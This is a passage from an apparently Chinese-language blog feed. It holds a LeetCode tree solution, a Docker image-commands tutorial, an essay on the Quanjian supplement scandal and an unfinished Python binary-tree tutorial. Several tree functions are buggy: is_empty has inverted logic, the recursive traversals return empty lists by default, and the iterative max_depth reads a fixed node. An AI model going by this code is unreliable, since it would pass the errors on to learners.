<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sumOfLeftLeaves</span><span class="params">(self, root)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type root: TreeNode</div><div class="line">        :rtype: int</div><div class="line">        """</div><div class="line">        <span class="keyword">if</span> root == <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> <span class="number">0</span></div><div class="line">        <span class="keyword">if</span> root.left <span class="keyword">and</span> root.left.left == <span class="keyword">None</span> <span class="keyword">and</span> root.left.right == <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> root.left.val + self.sumOfLeftLeaves(root.right)  <span class="comment"># 记录到结果中</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">return</span> self.sumOfLeftLeaves(root.left) + self.sumOfLeftLeaves(root.right)  <span class="comment"># 递归检查左右子节点</span></div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>Tree</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker 基本操作-镜像篇（上）</title>
    <url>/2019/01/27/Docker-%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C-%E9%95%9C%E5%83%8F%E7%AF%87%EF%BC%88%E4%B8%8A%EF%BC%89/</url>
    <content><![CDATA[<p><center>Docker 镜像基本操作介绍。</center><br><a id="more"></a></p>
<h4 id="获取镜像"><a href="#获取镜像" class="headerlink" title="获取镜像"></a>获取镜像</h4><p>　　Docker 运行容器前需要本地存在对应的镜像，如果本地不存在该镜像，Docker 会从镜像仓库下载该镜像。 从 Docker 镜像仓库获取镜像的命令是：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> docker pull [选项] [Docker Registry 地址[:端口号]/]仓库名[:标签]</span></div></pre></td></tr></table></figure>
<ul>
<li>Docker 镜像仓库地址：地址的格式一般是 &lt;域名/IP&gt;[:端口号] 。默认地址是 Docker Hub。</li>
<li>仓库名：如之前所说，这里的仓库名是两段式名称，即 &lt;用户名&gt;/&lt;软件名&gt; 。对于 Docker Hub，如果不给出用户名，则默认为 library ，也就是官方镜像。 </li>
<li>选项 <code>--all-tags , -a</code>，拉取所有 tagged 镜像；</li>
<li>选项 <code>--disable-content-trust</code>，忽略镜像的校验,默认开启；</li>
<li>选项 <code>--platform</code>，如果服务器具有多平台功能，用于设置平台（新版本特性）。</li>
</ul>
<p>　　示例，从Docker Hub 拉取 ubuntu 系统的镜像：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">root@iZwz96uyro861qckgz89ljZ:~# docker pull ubuntu</div><div class="line">Using default tag: latest</div><div class="line">latest: Pulling from library/ubuntu</div><div class="line">84ed7d2f608f: Pull complete </div><div class="line">be2bf1c4a48d: Pull complete </div><div class="line">a5bdc6303093: Pull complete </div><div class="line">e9055237d68d: Pull complete </div><div class="line">Digest: sha256:868fd30a0e47b8d8ac485df174795b5e2fe8a6c8f056cc707b232d65b8a1ab68</div><div class="line">Status: Downloaded newer image for ubuntu:latest</div></pre></td></tr></table></figure>
<h4 id="列出镜像"><a href="#列出镜像" class="headerlink" title="列出镜像"></a>列出镜像</h4><p>　　列出已经下载到本地的镜像，使用：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> docker image ls</span></div></pre></td></tr></table></figure>
<p>　　或者：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> docker images</span></div></pre></td></tr></table></figure>
<ul>
<li>选项 <code>--all, -a</code>，列出本地所有的镜像（含中间映像层，默认情况下，过滤掉中间映像层）；</li>
<li>选项 <code>--digests</code>，显示镜像的摘要信息；</li>
<li>选项 <code>--filter, -f</code>，显示满足条件的镜像；</li>
<li>选项 <code>--format</code>，指定返回值的模板文件；</li>
<li>选项 <code>--no-trunc</code>，显示完整的镜像信息；</li>
<li>选项<code>--quiet, -q</code>，只显示镜像ID。</li>
</ul>
<p>　　列表包含了<code>仓库名</code> 、 <code>标签</code> 、 <code>镜像 ID</code> 、 <code>创建时间</code> 以及 <code>所占用的空间</code> 。 </p>
<p>　　示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">root@iZwz96uyro861qckgz89ljZ:~# docker image ls</div><div class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">hello-world         latest              fce289e99eb9        3 weeks ago         1.84kB</div><div class="line">ubuntu              latest              1d9c17228a9e        3 weeks ago         86.7MB</div><div class="line">root@iZwz96uyro861qckgz89ljZ:~# docker images</div><div class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">hello-world         latest              fce289e99eb9        3 weeks ago         1.84kB</div><div class="line">ubuntu              latest              1d9c17228a9e        3 weeks ago         86.7MB</div></pre></td></tr></table></figure>
<h4 id="运行镜像"><a href="#运行镜像" class="headerlink" title="运行镜像"></a>运行镜像</h4><p>　　镜像是静态的定义，容器是镜像运行时的实体。这里称之为运行镜像其实是不合理的，因为只有容器才能说是运行。但是，启动容器有两种方式，一种是基于镜像新建一个容器并启动，另外一个是将在终止状态的容器重新启动。这里要说的就是基于镜像来启动容器：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> docker run [OPTIONS] IMAGE [COMMAND] [ARG...]</span></div></pre></td></tr></table></figure>
<p>　　Docker run命名的具体使用将在后续的博客中进行详细说明。这里给出一个简单的示例，通过运行 ubuntu 容器输出 <code>Hello world</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">root@iZwz96uyro861qckgz89ljZ:~/docker# docker run ubuntu /bin/echo "Hello world"</div><div class="line">Hello world</div></pre></td></tr></table></figure>
<h4 id="删除本地镜像"><a href="#删除本地镜像" class="headerlink" title="删除本地镜像"></a>删除本地镜像</h4><p>　　删除本地的镜像，可以使用 ：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> docker image rm [选项] &lt;镜像1&gt; [&lt;镜像2&gt; ...]</span></div></pre></td></tr></table></figure>
<p>　　其中， <code>&lt;镜像&gt;</code> 可以是 <code>镜像短 ID</code> 、 <code>镜像长 ID</code> 、 <code>镜像名</code> 或者 <code>镜像摘要</code> 。 </p>
<ul>
<li>选项 <code>--force , -f</code> ，强制删除镜像；</li>
<li>选项 <code>--no-prune</code> ，</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">root@iZwz96uyro861qckgz89ljZ:~# docker image rm ubuntu</div><div class="line">Untagged: ubuntu:latest</div><div class="line">Untagged: ubuntu@sha256:868fd30a0e47b8d8ac485df174795b5e2fe8a6c8f056cc707b232d65b8a1ab68</div><div class="line">Deleted: sha256:1d9c17228a9e80a0a23927f24f3cf17d012cf0bb3eae5e3541a8c6987ab9bd5a</div><div class="line">Deleted: sha256:3288cd6e6e7d42bcb4a74121b412c42a11f96da52685e42dbf9de6a747a55c6b</div><div class="line">Deleted: sha256:b1636589630239bdb9153f95ac564bcd2afd9202aaf8511cbf5a9a37e03daf35</div><div class="line">Deleted: sha256:043f492f40c539cfe7cee4cb8aae00ed1d5b19e864fbe6ea35ec92a2333bacc4</div><div class="line">Deleted: sha256:2fb7bfc6145d0ad40334f1802707c2e2390bdcfc16ca636d9ed8a56c1101f5b9</div></pre></td></tr></table></figure>
<h4 id="创建镜像"><a href="#创建镜像" class="headerlink" title="创建镜像"></a>创建镜像</h4><p>　　在运行着的容器的基础上生成镜像：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]</span></div></pre></td></tr></table></figure>
<ul>
<li>选项 <code>-a</code> ：提交的镜像作者；</li>
<li>选项 <code>-c</code> ：使用 Dockerfile 指令来创建镜像；</li>
<li>选项 <code>-m</code> ：提交时的说明文字；</li>
<li>选项 <code>-p</code> ：在 commit 时，将容器暂停。</li>
</ul>
<p>　　示例，将容器 9fbbb230909a 保存为新的镜像，并添加提交人信息和说明信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">root@iZwz96uyro861qckgz89ljZ:~/docker# docker ps</div><div class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS               NAMES</div><div class="line">9fbbb230909a        ubuntu              "/bin/bash -c 'while…"   23 minutes ago      Up 23 minutes                           admiring_chatterjee</div><div class="line">root@iZwz96uyro861qckgz89ljZ:~/docker# docker commit -a "fanzhenyu" -m "my ubuntu" 9fbbb230909a ubuntu:my</div><div class="line">sha256:fe0e9216b2dd575dff6b5521616b55ce996fdb89fd893ba9e80a8a671f6acc2d</div><div class="line">root@iZwz96uyro861qckgz89ljZ:~/docker# docker images</div><div class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">ubuntu              my                  fe0e9216b2dd        13 seconds ago      87.5MB</div><div class="line">ubuntu              latest              20bb25d32758        4 days ago          87.5MB</div></pre></td></tr></table></figure>
<p>　　构建镜像也可以通过：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> docker image build [OPTIONS] PATH | URL | -</span></div></pre></td></tr></table></figure>
<p>　　或：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> docker build [OPTIONS] PATH | URL | -</span></div></pre></td></tr></table></figure>
<p>　　使用 Dockerfiles 来实现。Dockerfile 是一个文本文件，其内包含了一条条的指令，每一条指令构建一层，因此每一条指令的内容，就是描述该层应当如何构建。 </p>
<p>　　示例，以定制 nginx 镜像为例，Dockerfile 的内容如下：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><div class="line"><span class="keyword">FROM</span> nginx</div><div class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">echo</span> <span class="string">'&lt;h1&gt;Hello, Docker!&lt;/h1&gt;'</span> &gt; /usr/share/nginx/html/index.html</span></div></pre></td></tr></table></figure>
<p>　　在 Dockerfile 文件所在目录执行： </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">root@iZwz96uyro861qckgz89ljZ:~/docker# docker image build -t nginx:my .</div><div class="line">Sending build context to Docker daemon  90.01MB</div><div class="line">Step 1/2 : FROM nginx</div><div class="line">latest: Pulling from library/nginx</div><div class="line">5e6ec7f28fb7: Pull complete </div><div class="line">ab804f9bbcbe: Pull complete </div><div class="line">052b395f16bc: Pull complete </div><div class="line">Digest: sha256:56bcd35e8433343dbae0484ed5b740843dd8bff9479400990f251c13bbb94763</div><div class="line">Status: Downloaded newer image for nginx:latest</div><div class="line"><span class="meta"> ---&gt;</span><span class="bash"> 42b4762643dc</span></div><div class="line">Step 2/2 : RUN echo '&lt;h1&gt;Hello, Docker!&lt;/h1&gt;' &gt; /usr/share/nginx/html/index.html</div><div class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> da558d0a335d</span></div><div class="line">Removing intermediate container da558d0a335d</div><div class="line"><span class="meta"> ---&gt;</span><span class="bash"> b6cca0cd24a1</span></div><div class="line">Successfully built b6cca0cd24a1</div><div class="line">Successfully tagged nginx:my</div></pre></td></tr></table></figure>
<p>　　特别注意命令最后的 <code>.</code> 符号，这个点一定要有，否则会报错。这里的 <code>.</code> 是在指定上下文路径 。</p>
<p>　　当构建的时候，用户会指定构建镜像上下文的路径， docker build 命令得知这个路径后，会将路径下的所有内容打包，然后上传给 Docker 引擎。这样Docker 引擎收到这个上下文包后，展开就会获得构建镜像所需的一切文件。 </p>
<h4 id="导入和导出镜像"><a href="#导入和导出镜像" class="headerlink" title="导入和导出镜像"></a>导入和导出镜像</h4><p>　　导出镜像，将一个或多个镜像保存到tar存档（默认情况下流式传输到标准输出）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> docker save [OPTIONS] IMAGE [IMAGE...]</span></div></pre></td></tr></table></figure>
<p>　　或：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> docker image save [OPTIONS] IMAGE [IMAGE...]</span></div></pre></td></tr></table></figure>
<ul>
<li>选项 <code>--output , -o</code> ，输出到的文件。</li>
</ul>
<p>　　示例，导出 ubuntu 镜像为 tar 文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">root@iZwz96uyro861qckgz89ljZ:~/docker# docker save -o ubuntu.tar ubuntu</div><div class="line">root@iZwz96uyro861qckgz89ljZ:~/docker# ls -lh</div><div class="line">total 86M</div><div class="line">-rw------- 1 root root 86M Jan 27 10:21 ubuntu.tar</div></pre></td></tr></table></figure>
<p>　　导入镜像，从tar存档或标准输入加载镜像：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> docker image load [OPTIONS]</span></div></pre></td></tr></table></figure>
<ul>
<li>选项 <code>--input , -i</code> ，从tar归档文件中读取，而不是标准输入；</li>
<li>选项 <code>--quiet , -q</code>，安静模式，不输出load的中间信息。</li>
</ul>
<p>　　示例，导入刚刚导出的 ubuntu 镜像：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">root@iZwz96uyro861qckgz89ljZ:~/docker# docker load -i ubuntu.tar</div><div class="line">adcb570ae9ac: Loading layer [==================================================&gt;]  89.95MB/89.95MB</div><div class="line">7604c8714555: Loading layer [==================================================&gt;]  15.87kB/15.87kB</div><div class="line">9e9d3c3a7458: Loading layer [==================================================&gt;]  11.26kB/11.26kB</div><div class="line">27a216ffe825: Loading layer [==================================================&gt;]  3.072kB/3.072kB</div><div class="line">Loaded image: ubuntu:latest</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Cloud/Edge Computing</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>保健品风波下的思考</title>
    <url>/2019/01/26/%E4%BF%9D%E5%81%A5%E5%93%81%E9%A3%8E%E6%B3%A2%E4%B8%8B%E7%9A%84%E6%80%9D%E8%80%83/</url>
    <content><![CDATA[<center>保健品阴影下，被坑害的中国家庭与老人。</center>

<a id="more"></a>
<p>　　权健事件发展到今天，相关部门已经采取措施，相信相关的违法犯罪分子一定会得到应有的惩罚，也相信通过这次事件能引起相关部门对保健品行业监管的重视。我们首先来回顾和梳理一下权健事件的整个脉络。</p>
<ul>
<li>2018年12月25日，丁香医生发表文章《百亿保健帝国权健，和它阴影下的中国家庭》，将天津权健公司推上风口。</li>
<li><p>2018年12月26日凌晨1:29，权健发布“严正声明”，指责丁香医生“利用从互联网搜集的不实信息，对权健进行诽谤中伤，严重侵犯权健合法权益，致使社会大众对权健品牌造成误解。”声明还要求，“丁香医生”撤稿并道歉，权健还将通过法律途径维护自身权益。</p>
</li>
<li><p>2018年12月26日，丁香医生转发权健声明回应称：不会删稿，对每一个字负责，欢迎来告。</p>
</li>
<li><p>2018年12月27日，天津市委、市政府责成市市场监管委、市卫健委和武清区等相关部门成立联合调查组，对网民关注的诸多问题展开调查核实，已进驻权健集团展开核查。</p>
</li>
<li>2019年1月1日，经前期工作发现，权健公司在经营活动中，涉嫌传销犯罪和涉嫌虚假广告犯罪，公安机关已依法对其涉嫌犯罪行为立案侦查。</li>
<li>2019年1月13日，天津市武清区人民检察院对公安机关提请批准逮捕的权健公司束某某等16名犯罪嫌疑人，经审查证据材料，告知犯罪嫌疑人诉讼权利并讯问犯罪嫌疑人后，以涉嫌组织、领导传销活动等罪依法作出批准逮捕决定。</li>
</ul>
<p>　　国家对于保健品的定义是：保健食品是食品的一个种类，具有一般食品的共性，能调节人体机能，适用于特定人群食用，但不以治疗疾病为目的。保健品不是药品，更不是“万能神药”，这应是一个共识和常识。然而，保健品广告依然存在虚假宣传的问题，常常神化保健品功效，甚至称其能治病，让患者产生误解甚至放弃正常治疗；有的以免费体检、旅游、讲座等为幌子，打亲情牌推销产品；有的许以高额返现、多买多赚等承诺，设置消费陷阱骗取钱财。</p>
<p>　　近年来，各种保健品推销的广告层出不穷。上大学以前，县城的电视台各种保健品和药品广告每天循环洗脑，县城的剧院经常有各种保健品宣传活动，他们很会抓住老年人的心态，总是以免费零鸡蛋，领纸巾等噱头来吸引老年人。老年人往往睡眠不好，很早就起来，经常听到很早很早剧院门口就排起了长队。也听说过很多老年人被忽悠得退休工资全部砸进去，子女劝也劝不住，最后和子女闹僵的例子。现如今回去得少，不知道，现在是否还是这样？虽然权健只是庞大的保健品帝国中得一家，这一次的事件可能并不能完全整治好这个领域，但是至少能够引起相关部门的重视，也可以让一些意识到保健品真的没有那么神，更多的是骗局。</p>
<p>　　最近，我也在学校里碰到一个老年人，估计就是我们学校的老教师了，行动不便，走路很慢。旁边还有一个年轻的小伙子，在推销产品，非常耐心和热情。一看就知道又是推销保健品的！还问老爷爷住几栋几单元，下次先拿一点吃着去试一下，看有没有效果，有效果再买都可以。这样的事情已经遇到不止一两次了，这种推销员真是超级可恶。竟然忍心去欺骗这么老的老人，想想当我们到这样的年纪，还要被别人忽悠，真的是好可怜。</p>
<p>　　其实，对于年轻人来说是不会轻易上当的，遇到这样的事情，发出质问三连：如果药物有效，为什么正规超市和药店都买不到？如果药物有效，为什么推销员会把你当做亲妈？如果药物有效，为什么推销过程像做地下工作一样？三个问题下来，基本就可以得出结论。保健品真的不能用来治病，更不可能有广告和推销人员宣传的那么好的效果。但是，对于老人，特别是当下，缺乏关怀的很多老年人。推销人员抓住了部分独居老人的心理，他们的子女通常忙于工作，很少关心老人，于是这些推销人员三天两头找老人聊天，嘘寒问暖，老人的心理防线很快被攻破，然后开始使用各种推销手段，让老人试用产品，花言巧语，最终让老人们觉得他们的东西确实好，有效果。</p>
<p>　　有些儿女发现老人被骗，劝阻无效，还被误会是耽误老人延年益寿，最终搞得家庭矛盾越来越多。当然，还有另外一个群体，那就是保健品的卖家，有一些年轻人，想着发财，开店卖保健品。然后，这些人通常从亲戚开始下手，作为亲戚经常需要给个面子买一些的。但长此以往，谁还敢见这样的亲戚。不买伤感情，买了伤钱包。总之，保健品影响了很多家庭关系，带来了很多社会问题。这其中，涉及到多少利益群体，相关部门确实应该好好查一查了，更应该加大对保健品行业的监管力度，杜绝保健品被神化，防止老人被骗。</p>
<p>　　2018年，从疫苗事件，再到权健风波，一个是危害中国儿童的健康，残害着下一代，一个是残害中国中老年人的健康，以传销形式破坏无数家庭。伤害的是两个最脆弱的群体，这个社会真的有很多病态的人，为了利益，什么事情都做得出来。愿老人和小孩都能被这个社会温柔以待啊，每每看到这样的新闻都觉得很心酸。</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 数据结构-二叉树</title>
    <url>/2019/01/23/Python-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    <content><![CDATA[<p><center>Python 数据结构-二叉树学习。</center><br><a id="more"></a></p>
<p>　　二叉树是树的特殊一种，具有如下特点：1、每个结点最多有两颗子树，结点的度最大为2。2、左子树和右子树是有顺序的，次序不能颠倒。3、即使某结点只有一个子树，也要区分左右子树。</p>
<h4 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h4><h5 id="节点"><a href="#节点" class="headerlink" title="节点"></a>节点</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span><span class="params">()</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, val = <span class="number">0</span>)</span>:</span></div><div class="line">        self.val = val</div><div class="line">        self.left = <span class="keyword">None</span></div><div class="line">        self.right = <span class="keyword">None</span></div></pre></td></tr></table></figure>
<h5 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">BinaryTree</span><span class="params">()</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        self.root = <span class="keyword">None</span></div></pre></td></tr></table></figure>
<h4 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h4><h5 id="插入节点"><a href="#插入节点" class="headerlink" title="插入节点"></a>插入节点</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">insert_node</span><span class="params">(self, val)</span>:</span></div><div class="line">    node = Node(val)</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> self.root:</div><div class="line">        self.root = node</div><div class="line">        <span class="keyword">return</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        q = [self.root]</div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            root = q.pop(<span class="number">0</span>)</div><div class="line">            <span class="keyword">if</span> root.left <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">                root.left = node</div><div class="line">                <span class="keyword">return</span></div><div class="line">            <span class="keyword">elif</span> root.right <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">                root.right = node</div><div class="line">                <span class="keyword">return</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                q.append(root.left)</div><div class="line">                q.append(root.right)</div></pre></td></tr></table></figure>
<h5 id="判断是否为空"><a href="#判断是否为空" class="headerlink" title="判断是否为空"></a>判断是否为空</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_empty</span><span class="params">(self)</span>:</span></div><div class="line">    <span class="keyword">if</span> self.root:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div></pre></td></tr></table></figure>
<h5 id="统计节点数"><a href="#统计节点数" class="headerlink" title="统计节点数"></a>统计节点数</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_node</span><span class="params">(self, root)</span>:</span></div><div class="line">    <span class="keyword">if</span> root <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="number">1</span> + self.count_node(root.left) + self.count_node(root.right)</div></pre></td></tr></table></figure>
<h5 id="最大深度"><a href="#最大深度" class="headerlink" title="最大深度"></a>最大深度</h5><ul>
<li><strong>递归方式</strong></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">max_depth</span><span class="params">(self, root)</span>:</span></div><div class="line">    <span class="keyword">if</span> root <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span></div><div class="line">    <span class="keyword">return</span> <span class="number">1</span> + max(self.max_depth(root.left), self.max_depth(root.right))</div></pre></td></tr></table></figure>
<ul>
<li><strong>非递归方式</strong></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">max_depth</span><span class="params">(self, root)</span>:</span></div><div class="line">    <span class="keyword">if</span> root <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span></div><div class="line">    depth = <span class="number">0</span></div><div class="line">    queue = [root]</div><div class="line">    <span class="keyword">while</span> len(queue) != <span class="number">0</span>:</div><div class="line">        depth += <span class="number">1</span></div><div class="line">        node = queue[<span class="number">0</span>]</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(queue)):</div><div class="line">            <span class="keyword">if</span> node.left:</div><div class="line">                queue.append(node.left)</div><div class="line">            <span class="keyword">if</span> node.right:</div><div class="line">                queue.append(node.right)</div><div class="line">            <span class="keyword">del</span> queue[<span class="number">0</span>]</div><div class="line">    <span class="keyword">return</span> depth</div></pre></td></tr></table></figure>
<h5 id="构造树"><a href="#构造树" class="headerlink" title="构造树"></a>构造树</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line">nums = [<span class="number">4</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">9</span>]</div><div class="line">tree = BinaryTree()</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> nums:</div><div class="line">    tree.insert_node(i)</div></pre></td></tr></table></figure>
<p>　　生成如下所示的二叉树：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">     4</div><div class="line">   /   \</div><div class="line">  2     7</div><div class="line"> / \   / \</div><div class="line">1   3 6   9</div></pre></td></tr></table></figure>
<h5 id="打印树"><a href="#打印树" class="headerlink" title="打印树"></a>打印树</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_tree</span><span class="params">(self, root)</span>:</span></div><div class="line">    <span class="keyword">if</span> root:</div><div class="line">        print(root.val, end=<span class="string">" "</span>)</div><div class="line">        self.print_tree(root.left)</div><div class="line">        self.print_tree(root.right)</div></pre></td></tr></table></figure>
<h4 id="反转树"><a href="#反转树" class="headerlink" title="反转树"></a>反转树</h4><ul>
<li><strong>递归方式</strong></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">invert_tree</span><span class="params">(self, root)</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> root:</div><div class="line">        <span class="keyword">return</span></div><div class="line">    root.left, root.right = root.right, root.left</div><div class="line">    <span class="keyword">if</span> root.left:</div><div class="line">        self.invert_tree(root.left)</div><div class="line">    <span class="keyword">if</span> root.right:</div><div class="line">        self.invert_tree(root.right)</div></pre></td></tr></table></figure>
<ul>
<li><strong>非递归方式</strong></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">invert_tree</span><span class="params">(self, root)</span>:</span></div><div class="line">    <span class="keyword">if</span> root <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">        <span class="keyword">return</span> root</div><div class="line">    <span class="keyword">if</span> root.left <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span> <span class="keyword">or</span> root.right <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">        tmp = root.left</div><div class="line">        root.left = root.right</div><div class="line">        root.right = tmp</div><div class="line">        <span class="keyword">if</span> root.left <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">            self.invert_tree(root.left)</div><div class="line">        <span class="keyword">if</span> root.right <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">            self.invert_tree(root.right)</div><div class="line">    <span class="keyword">return</span> root</div></pre></td></tr></table></figure>
<h4 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h4><h5 id="前序遍历"><a href="#前序遍历" class="headerlink" title="前序遍历"></a>前序遍历</h5><ul>
<li><strong>递归方式</strong></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">pre_order</span><span class="params">(self, root, res=None)</span>:</span></div><div class="line">    <span class="keyword">if</span> root <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">        <span class="keyword">return</span> []</div><div class="line">    <span class="keyword">if</span> res <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">        <span class="keyword">return</span> []</div><div class="line">    res.append(root.val)</div><div class="line">    self.pre_order(root.left, res)</div><div class="line">    self.pre_order(root.right, res)</div><div class="line">    <span class="keyword">return</span> res</div></pre></td></tr></table></figure>
<ul>
<li><strong>非递归方式</strong></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">pre_order</span><span class="params">(self, root)</span>:</span></div><div class="line">    res = []</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> root:</div><div class="line">        <span class="keyword">return</span> res</div><div class="line">    stack = []</div><div class="line">    stack.append(root)</div><div class="line">    <span class="keyword">while</span> stack:</div><div class="line">        root = stack.pop()</div><div class="line">        res.append(root.val)</div><div class="line">        <span class="keyword">if</span> root.right:</div><div class="line">            stack.append(root.right)</div><div class="line">        <span class="keyword">if</span> root.left:</div><div class="line">            stack.append(root.left)</div><div class="line">    <span class="keyword">return</span> res</div></pre></td></tr></table></figure>
<h5 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h5><ul>
<li><strong>递归方式</strong></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">in_order</span><span class="params">(self, root, res=None)</span>:</span></div><div class="line">    <span class="keyword">if</span> root <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">        <span class="keyword">return</span> []</div><div class="line">    <span class="keyword">if</span> res <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">        <span class="keyword">return</span> []</div><div class="line">    self.in_order(root.left, res)</div><div class="line">    res.append(root.val)</div><div class="line">    self.in_order(root.right, res)</div><div class="line">    <span class="keyword">return</span> res</div></pre></td></tr></table></figure>
<ul>
<li><strong>非递归方式</strong></li>
</ul>
